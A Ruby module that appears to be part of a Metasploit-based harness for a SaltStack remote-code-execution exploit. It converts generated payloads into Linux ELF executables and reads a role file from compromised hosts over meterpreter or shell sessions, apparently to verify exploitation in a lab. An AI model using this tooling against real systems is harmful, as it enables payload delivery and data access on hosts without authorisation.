# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require_relative '../saltstack_rce/session_control'

# Public payload/session APIs only; no owning methods or encoders are replaced.
module SaltDeploymentSessionControl
  ROLE_FILE = '/var/run/salt/deployment-role.json'

  def self.executable(job, expected, framework)
    generated = RocketmqSessionControl.command(job, expected)
    raw = Base64.strict_decode64(generated.fetch(:command_base64))
    bytes = if raw.start_with?("\x7fELF".b)
              raw
            elsif expected.start_with?('linux/x64/')
              Msf::Util::EXE.to_linux_x64_elf(framework, raw)
            elsif expected.start_with?('linux/x86/')
              Msf::Util::EXE.to_linux_x86_elf(framework, raw)
            else
              raise ArgumentError, 'Unsupported native executable architecture'
            end
    raise 'Native executable wrapper did not produce ELF bytes' unless bytes.start_with?("\x7fELF".b)

    generated.merge(executable_base64: Base64.strict_encode64(bytes), executable_sha256: Digest::SHA256.hexdigest(bytes))
  end

  def self.role(framework, identifier)
    session = framework.sessions.fetch(identifier)
    if session.type == 'meterpreter'
      file = session.fs.file.new(ROLE_FILE, 'rb')
      begin
        role = JSON.parse(file.read)
      ensure
        file.close
      end
    else
      encoded = session.shell_command_token("base64 -w0 #{ROLE_FILE}")
      role = JSON.parse(Base64.decode64(encoded))
    end
    role
  end

  def self.proof(framework, identifier, path, value)
    result = SaltSessionControl.proof(framework, identifier, path, value)
    # Native ELF payloads can replace their environment. The daemon state file,
    # RPC proof file, peer address and native PID establish container identity.
    result.merge(container_role: role(framework, identifier))
  end
end
